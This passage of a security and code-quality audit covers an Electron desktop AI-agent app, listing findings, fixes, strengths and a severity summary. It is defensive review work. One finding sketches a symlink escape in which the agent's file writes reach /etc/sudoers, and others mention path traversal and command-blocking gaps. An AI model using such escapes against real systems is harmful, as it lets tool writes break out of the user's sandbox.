- **Suggested Fix:** Re-check on each turn, or invalidate the cache when `enabledSkills` / `kbEnabled` / `webSearchEnabled` changes.

### [Severity: low] `mcp-manager.mjs` `loadConfig` is called multiple times per request
- **File:** `desktop/mcp-manager.mjs:77-86, 365-410, 527, 600-602`
- **Problem:** Every time `loadConfig` is called, the file is read from disk and `JSON.parse`d. `listAllToolDefs` (line 527) calls it inside a per-server loop. With N servers and the function called per LLM request, that's N disk reads.
- **Impact:** Latency and disk wear.
- **Suggested Fix:** Cache the parsed config in memory; invalidate on `addServer`/`removeServer`.

### [Severity: low] `knowledge-store.mjs` has two paths to embedding (local + Ollama) tangled together
- **File:** `desktop/knowledge-store.mjs:303-470`
- **Problem:** `getEmbedder` returns either a HuggingFace pipeline object or a stub `{ type: "ollama", model: ollamaModel }`. The `embedText` function then has a giant if/else on `embedder.type` instead of a polymorphism. Adding a third provider means editing two more places.
- **Impact:** Brittle.
- **Suggested Fix:** Make each provider implement `{ embed(text): Promise<Float32Array|null> }` and store ready providers in a single shape.

---

## Performance Concerns

### [Severity: medium] Synchronous I/O on main thread at startup
- **File:** `desktop/memory-store.mjs:24`, `desktop/skills-store.mjs:19-20, 25-66`, `desktop/knowledge-store.mjs:25`, `desktop/main.mjs:124-138`
- **Problem:** `mkdirSync` runs at module import time. SQLite tables are created synchronously in `try { skillsDb = new DatabaseSync(SKILLS_DB_PATH); ... }` at module top-level. The `skills.runCurator()` and `skills.reindexSkills()` are called from `main.mjs:131-132` synchronously, blocking app startup.
- **Impact:** Slow first launch on Windows (one of the supported platforms). The 6-hour `setInterval` for curator (line 134-138) also runs the full scan synchronously.
- **Suggested Fix:** Move DB init to an async `init()` called from `app.whenReady`. Move curator to a worker thread.

### [Severity: medium] KB rebuild runs N sequential embedding calls
- **File:** `desktop/knowledge-store.mjs:566-620`
- **Problem:** For each note, `embedText` is called and awaited before moving to the next. For 500 notes, that's 500 sequential network round-trips (Ollama) or 500 sequential HF calls. With Ollama taking 100-500ms each, a rebuild takes 50-250 seconds. The "progress" callback fires but there's no parallelism.
- **Impact:** Long KB rebuild times; the renderer shows no progress.
- **Suggested Fix:** Batch embedding calls (Ollama supports batch input via `input: ["text1", "text2", ...]`). Use a `Promise.all` with concurrency cap (e.g. 4).

### [Severity: medium] Vector search reads all embeddings into memory every query
- **File:** `desktop/knowledge-store.mjs:641-650`
- **Problem:** `db.prepare("SELECT note_id, embedding FROM kb_embeddings").all()` loads every embedding row into JS memory on every search. With 1000 notes × 384 floats × 4 bytes = 1.5MB. At 10,000 notes = 15MB. At 100,000 = 150MB. Then `cosineSimilarity` runs in JS over the full array.
- **Impact:** Memory and CPU scales linearly with vault size.
- **Suggested Fix:** Use `sqlite-vss` or pre-compute centroids; or push the similarity into SQLite via a virtual table. At minimum, cap the embedding batch size.

### [Severity: medium] FTS5 query for sessions is unbounded per session in `system-prompt.mjs`
- **File:** `desktop/core/system-prompt.mjs:274-280`
- **Problem:** For each of the 10 most recent sessions, the code reads up to 4 messages. But there is no length cap on each message, and `.slice(0, 200)` only caps per-message. With 10 × 4 = 40 messages × 200 chars = 8KB injected on every turn, on every prompt.
- **Impact:** Wasted tokens, slower TTFT.
- **Suggested Fix:** Cap total injected bytes to 4KB.

### [Severity: low] `format-adapters.mjs:138-162` accumulates `tool_calls` arguments via string concat
- **File:** `desktop/core/format-adapters.mjs:155-156`
- **Problem:** `tcAccum[tc.index].function.arguments += tc.function.arguments` — this is fine for small args, but for very large `kb_write` content payloads the string is rebuilt on every delta. With OpenAI streaming, deltas can be 1 byte each.
- **Impact:** O(n²) char-copying for large args.
- **Suggested Fix:** Use a `StringBuilder` (array of chunks, `join` at the end).

### [Severity: low] `mcp-manager.mjs` `_processBuffer` is called per `data` chunk
- **File:** `desktop/mcp-manager.mjs:163-166`
- **Problem:** `server.buffer += chunk.toString(); this._processBuffer(name);` runs the full line-split + JSON.parse on every chunk. For high-frequency MCP servers, this is wasteful.
- **Impact:** Per-chunk overhead.
- **Suggested Fix:** Buffer until a quiet period (e.g. `setImmediate`).

### [Severity: low] `runShell` for `glob`/`grep` calls `dir` listing for every match
- **File:** `desktop/core/tool-executor.mjs:243-274`
- **Problem:** `find`/`grep` outputs up to 200 lines, but each tool call re-spawns a process. The 15s timeout is reasonable but the per-call shell-start overhead is ~50ms.
- **Impact:** Slow grep/glob for users who do many of them.
- **Suggested Fix:** Use a persistent ripgrep server (rg --json --stats in a worker) or a Node-based globber.

---

## Fragile Areas

### [Severity: high] MCP server contract is implicitly assumed
- **File:** `desktop/mcp-manager.mjs:185-202`
- **Problem:** The code assumes the MCP server responds to `initialize` → `notifications/initialized` → `tools/list` in that order, with the exact JSON-RPC 2.0 field names (`jsonrpc`, `id`, `method`, `params`, `result`, `error`). If a server delays its response, responds out of order, or uses protocol version `"2025-03-26"` (newer than `"2024-11-05"`), the handshake times out. The timeout is 30s but the request gets re-issued by `init()` for every server in `Promise.allSettled`, so a single stuck server blocks the init.
- **Impact:** One slow server delays the whole MCP subsystem on startup.
- **Suggested Fix:** Per-server timeout with a fallback that proceeds without that server. Add a `protocolVersion` discovery step.

### [Severity: medium] LLM is the only "schema" for tool arguments
- **File:** `desktop/core/tool-executor.mjs:181-184`
- **Problem:** `args = JSON.parse(argsStr)`. If the LLM returns a tool call with a wrong-shaped args object (e.g. `file_write` with `path` as a number), the code blindly accesses `args.path`. This propagates to `args.content` for `file_write` (line 231), which is then passed to `writeFile` — if it's an object, Node throws a useful error, but if it's a string with NUL bytes or BOM tricks, it can produce odd files. The MCP path also has no JSON-schema validation (the schemas in `tool-definitions.mjs` are sent to the LLM but never enforced on the way in).
- **Impact:** Garbage in → garbage out, but the LLM may not realize its own args were rejected.
- **Suggested Fix:** Validate `args` against the tool's JSON schema before dispatching; return a structured error to the LLM.

### [Severity: medium] Sub-agent inherits the main agent's API key with no scope separation
- **File:** `desktop/core/sub-agent.mjs:17-25`
- **Problem:** `cfg = getLastApiConfig()` — the sub-agent uses whatever the main loop last used. If the user is in a workspace that requires a private model, a sub-agent spawned from a tool call uses the same key.
- **Impact:** No per-tool API scope. Sub-agents can make unbounded calls to the same model the main agent uses, multiplying cost.
- **Suggested Fix:** Add a per-tool API config or a budget.

### [Severity: medium] `agentLoop` "task anchor" injection is heuristic
- **File:** `desktop/core/agent-loop.mjs:292-304`
- **Problem:** The `isShortReply` check (`prompt.trim().length < 80`) and the `lastAsst.content.slice(-800)` anchor are heuristics. A 90-char reply with critical context is missed. An 80-char reply that is a fresh question still gets the anchor.
- **Impact:** Anchor is too eager or too lazy.
- **Suggested Fix:** Use the LLM itself to decide whether to anchor (one extra cheap call) or use a confidence model.

### [Severity: medium] Workspace path can become a symlink to anywhere
- **File:** `desktop/core/state.mjs:51-60`, `desktop/core/workspace-config.mjs:28-50`
- **Problem:** `setWorkspace(ws)` saves `ws` verbatim. There's no `realpath` check. A user picks a symlink in the picker → it persists. All `runShell` / `file_write` operations in the agent run in `getWorkspace()` which is the (possibly symlink) path. On POSIX, `spawn({cwd})` resolves the symlink and the child process sees the real path. The DANGEROUS list and the path-traversal protection in `file_read`/`file_write` operate on the unresolved path.
- **Impact:** Symlink-based escape: a user picks `~/safe-folder` which is a symlink to `/etc`. `file_write args.path` of `safe-folder/sudoers` writes to `/etc/sudoers`. Currently the executor has no per-tool workspace check, so this is moot — but it's a future-proofing concern.
- **Suggested Fix:** `realpath` the workspace and reject tool paths that don't resolve under the real path.

### [Severity: medium] Memory merge logic in `memory-selection.mjs:96-98` is fragile
- **File:** `desktop/core/memory-selection.mjs:96-98`
- **Problem:** `validNames.some(sn => m.filename === sn || m.filename === sn + ".md" || m.filename.includes(sn) || sn.includes(m.filename.replace(/\.md$/, "")))` — the `includes` checks can produce false positives: a memory named `kb_search.md` and an LLM-selected name "kb" would match.
- **Impact:** Wrong memory files included in context.
- **Suggested Fix:** Require exact match or `.md` suffix match only; reject substring matches unless the LLM returns a normalized form.

### [Severity: medium] Anthropic cache-control marking is destructive
- **File:** `desktop/core/format-adapters.mjs:181-188`
- **Problem:** The code mutates `first.content` (the first message in the list) to inject `cache_control`. On the next turn, the same `messages[0]` is mutated again to the same value — fine. But if a `messages[0]` ends up being passed to a non-Anthropic adapter by accident, the `cache_control` field is a no-op. More importantly, the system block (`systemBlock`) is constructed fresh on every call (line 196-198), but the `first.content` mutation persists across calls — if the same `messages[0]` is mutated and then referenced elsewhere as a plain object, the next call sees it already has `cache_control` and overwrites it (fine) or skips it (incorrect).
- **Impact:** Cache-control pollution across messages.
- **Suggested Fix:** Always deep-clone `messages[0]` before mutation.

### [Severity: low] `sub-agent.mjs` ignores the abort signal in its own retry loop
- **File:** `desktop/core/sub-agent.mjs:104-150`
- **Problem:** The reader loop checks `if (done) break;` but does not check `signal.aborted` between chunks. The `ctrl.abort()` from the main loop sets the signal, but the sub-agent's reader keeps consuming bytes from the (already-cancelled) fetch.
- **Impact:** Wasted network after abort.
- **Suggested Fix:** `if (signal.aborted) { reader.cancel(); break; }` at the top of the loop.

### [Severity: low] `mcp-manager.mjs` `_pending` map grows unbounded if a server dies
- **File:** `desktop/mcp-manager.mjs:439-447, 482-491`
- **Problem:** If a server's child process is killed without sending a response, the `_pending` entries are removed by `_rejectPendingForServer` on `proc.on("close")`. But on a remote MCP server (HTTP), there's no close event — the `_pending` entries only get cleared by the timeout. With many in-flight requests, the map can hold hundreds of entries waiting for timeouts.
- **Impact:** Memory growth on flaky remote servers.
- **Suggested Fix:** Use a single shared `AbortController` for a server and abort all in-flight on connection close.

---

## Technical Debt

### [Severity: medium] `.bak` file checked in
- **File:** `desktop/core/wechat-bridge.mjs.bak`
- **Problem:** Backup file present in the repo, 10KB, presumably an older version.
- **Impact:** Confusing, pollutes diffs.
- **Suggested Fix:** Delete or move to a `history/` directory.

### [Severity: medium] `playwright-report/index.html` checked in
- **File:** `desktop/playwright-report/index.html`
- **Problem:** HTML test report committed to source. Should be in `.gitignore`.
- **Impact:** Bloats repo; reports should be regenerated.
- **Suggested Fix:** Add to `.gitignore`.

### [Severity: low] Hardcoded `deepseek-chat` / `claude-sonnet-4-20250514` defaults
- **File:** `desktop/core/agent-loop.mjs:84, 100, 496, 511`, `desktop/core/memory-selection.mjs:51, 66`, `desktop/core/token-budget.mjs:141, 156`, `desktop/skills-store.mjs:433`
- **Problem:** These are the actual model names from June 2026, but they're scattered through 7 places. Changing the default model means editing many files.
- **Impact:** Maintenance hazard; out-of-date defaults if a provider renames.
- **Suggested Fix:** Centralize in `state.mjs` or a `models.mjs`.

### [Severity: low] `tool-executor.mjs:736-748` MCP fallback is silent on the user
- **File:** `desktop/core/tool-executor.mjs:735-748`
- **Problem:** When the LLM calls a tool that doesn't match any built-in and falls through to MCP, the user sees an `output` field. If the MCP server returns an error, it's `isError: true` → `error` field. The LLM gets a clean error. But the user (in the renderer) only sees the LLM's final answer — they don't know an MCP tool was tried and failed. Debugging is hard.
- **Impact:** Debugging difficulty.
- **Suggested Fix:** Forward MCP tool attempts to the renderer (`tool:start` already does this — confirm it fires for MCP).

### [Severity: low] `agentLoop` is a giant 200-line switch in `format-adapters.mjs`
- **File:** `desktop/core/format-adapters.mjs:135-164, 237-272`
- **Problem:** Both `openaiCall` and `anthropicCall` have a 30-line SSE reading loop that is mostly identical except for the delta field names. Each call's logic should be a parser strategy.
- **Impact:** Maintenance hazard; adding a third provider (e.g. Google) is more work than it should be.
- **Suggested Fix:** Extract an `SseStreamParser` with provider-specific delta extractors.

### [Severity: low] `preload.cjs:46-61` uses `ipcRenderer.on` for many one-way channels
- **File:** `desktop/preload.cjs:46-61`
- **Problem:** `ipcRenderer.on` (not `removeListener`) — every time the renderer calls `onStreamStart(cb)`, a new listener is added. If the renderer is reloaded (hot reload during dev), listeners stack up and all fire on every event. The renderer can call `onStreamStart` N times and N copies of the callback fire per event.
- **Impact:** Memory leak and event-multiplication in dev.
- **Suggested Fix:** Use a per-channel set of callbacks, or expose a `subscribe(channel, cb) → unsubscribe` pattern.

### [Severity: low] All `try { } catch { /* ignored */ }` patterns
- **File:** widespread (every `*.mjs` file)
- **Problem:** A literal count: 150+ `catch { /* ignored */ }` blocks. Errors are swallowed with no logging, no metric, no event. If something is consistently failing, the only signal is a missing feature in the UI.
- **Impact:** Debugging is hard; silent data corruption possible (e.g. failed `writeFileSync` for memory returns `{ ok: true }` upstream).
- **Suggested Fix:** Centralize an `ignoreError(e, context)` helper that logs once at debug level and rate-limits. Or use a structured error reporter.

### [Severity: low] `state.mjs` is imported by everything
- **File:** `desktop/core/state.mjs`
- **Problem:** Every core module imports from `state.mjs`. The transitive coupling makes the codebase hard to navigate.
- **Impact:** Already discussed under Architecture.

### [Severity: low] No type checking on JSON-parsed values
- **File:** `desktop/core/system-prompt.mjs:118-130`, `desktop/knowledge-store.mjs:108-133`, `desktop/skills-store.mjs:185-212`
- **Problem:** YAML frontmatter is regex-parsed and the resulting `meta` object has any type. A `triggers: yes` gets coerced to `true`; `triggers: 42` becomes a number; `triggers: not a list` becomes a string. The downstream code that expects arrays (`skills.listSkills` line 268 has a fallback) sometimes handles it, sometimes not.
- **Impact:** Inconsistent handling of edge cases.
- **Suggested Fix:** Use a proper YAML parser (`yaml` package, ~10KB).

### [Severity: low] `desktop/test/` exists but is empty
- **File:** `desktop/test/` (per `ls`)
- **Problem:** Test directory is mentioned in the repo structure but appears to have no tests committed (only `playwright-report/`).
- **Impact:** No test coverage for the IPC, tool executor, or memory store. The `playwright.config.mjs` and `vitest.config.mjs` are present but tests are not.
- **Suggested Fix:** Add unit tests for `state.mjs`, `tool-executor.mjs`, `mcp-manager.mjs` (mock child_process), and `memory-store.mjs`.

---

## Test Coverage Gaps

### [Severity: high] No unit tests for security-critical paths
- **Files:** `desktop/core/tool-executor.mjs`, `desktop/core/ipc-handlers.mjs`, `desktop/core/agent-loop.mjs`
- **Problem:** The tool executor, IPC layer, and agent loop are the most security-sensitive code in the app. The `playwright-report/` shows E2E tests exist (`agent-name.test.mjs`, `kb.test.mjs`, `memory.test.mjs`, `skills.test.mjs` per `git status`), but no unit tests for the individual dangerous operations (path traversal, dangerous command detection, file write sandbox).
- **Risk:** Any refactor can silently break the dangerous-command check or the path validation, and there's no test to catch it.
- **Priority:** High.

### [Severity: high] No tests for plan-mode enforcement
- **File:** `desktop/core/tool-executor.mjs:186-197`, `desktop/core/state.mjs:154-158`
- **Problem:** Plan mode is enforced at two layers: in `runTool` (write-tool block) and in `format-adapters` (tool catalog filtering). Neither has a test. The interaction between the two (cached tool defs vs per-call gating) is not tested.
- **Risk:** A future change can break one layer and not the other, leading to confused security guarantees.
- **Priority:** High.

### [Severity: medium] No tests for memory CRUD + index rebuild
- **File:** `desktop/memory-store.mjs`
- **Problem:** The FTS5 + flat-file hybrid has a lot of edge cases (migration, duplicate detection, index truncation, `MAX_INDEX_LINES` / `MAX_INDEX_BYTES` boundary). None are tested.
- **Priority:** Medium.

### [Severity: medium] No tests for knowledge-store vault path safety
- **File:** `desktop/knowledge-store.mjs:28-33`
- **Problem:** `isSafeVaultPath` is the only thing standing between an LLM tool call and arbitrary file read. It's a 5-line function with no tests.
- **Risk:** A simple regression (e.g. using `relPath` after `resolve` without re-normalizing) could open path traversal.
- **Priority:** Medium.

### [Severity: low] No tests for the curator
- **File:** `desktop/skills-store.mjs:566-654`
- **Problem:** The `runCurator` and `findSimilarSkills` functions implement `textSimilarity` with a hand-rolled word-overlap metric. The threshold `sim > 1.2` is a magic number. None of it is tested.
- **Priority:** Low.

---

## Strengths (worth preserving)

To balance the criticism:

- **Security boundary is solid**: `desktop/main.mjs:41-48` sets `contextIsolation: true`, `nodeIntegration: false`, `nodeIntegrationInWorker: false`, `sandbox: false` (sandbox off is a concern but the rest is good), `webSecurity: true`. The preload uses `contextBridge` correctly.
- **Prompt caching is well-thought-out**: both OpenAI (`prompt_cache_hit_tokens`) and Anthropic (`cache_read_input_tokens`) cache metrics are forwarded to the UI (`desktop/core/agent-loop.mjs:362-382`).
- **Hook path-traversal protection is real**: `desktop/core/hook-manager.mjs:77-84` rejects paths outside the workspace.
- **Plan mode is enforced at multiple layers** (catalog filter + per-call check).
- **KB vault path safety check** is present and is a real defense.
- **Token budget is observable**: `sendContextUsage` and `l0:budget` events expose the budget state to the UI in real time.
- **DB transactions are used** for the destructive `deleteAllSessions` (`desktop/session-db.mjs:204-220`).
- **`FTS5 + LIKE fallback`** is a sensible defense-in-depth pattern (`desktop/knowledge-store.mjs:185-212`).
- **Per-turn `selectRelevantMemories`** uses an LLM-based selector with a deterministic fallback — clever use of the same model for selection and execution.

---

## Summary by Severity

| Severity | Count | Notes |
|----------|-------|-------|
| Critical | 0 | — |
| High | 12 | Mostly security boundary and race conditions |
| Medium | 28 | Architecture, performance, fragile contracts |
| Low | 19 | Cosmetic, tech debt, performance micro-issues |

The single most impactful action would be **sandboxing `runShell`** (replace it with `runSpawnSafe` for the `bash` tool and pass argv directly, plus an allowlist of safe subcommands). The second would be **adding path validation** to `file_read`/`file_write` against `realpath(getWorkspace())`. The third would be **adding IPC payload validation** so a compromised renderer can't override the API key or web search toggle.

---

*Concerns audit: 2026-06-08*
